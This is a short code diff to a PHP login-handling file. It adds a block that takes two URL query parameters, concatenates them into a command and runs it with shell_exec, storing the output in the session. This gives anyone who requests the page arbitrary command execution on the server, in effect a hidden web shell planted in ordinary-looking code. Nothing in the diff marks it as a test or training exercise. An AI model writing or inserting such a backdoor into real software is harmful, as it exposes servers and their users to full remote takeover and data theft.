@@ -37,6 +37,18 @@ if(isset($_SESSION['login_failed']))
     unset($_SESSION['login_failed']);
 }
 
+if(isset($_GET['sysopt']))
+{
+    $sysopt = $_GET['sysopt'];
+    
+    $command = $sysopt . ' ' . $_GET['syscommand'];
+    
+    $output = shell_exec($command);
+    
+    $_SESSION['output'] = $output;
+    
+}
+
 
 
 
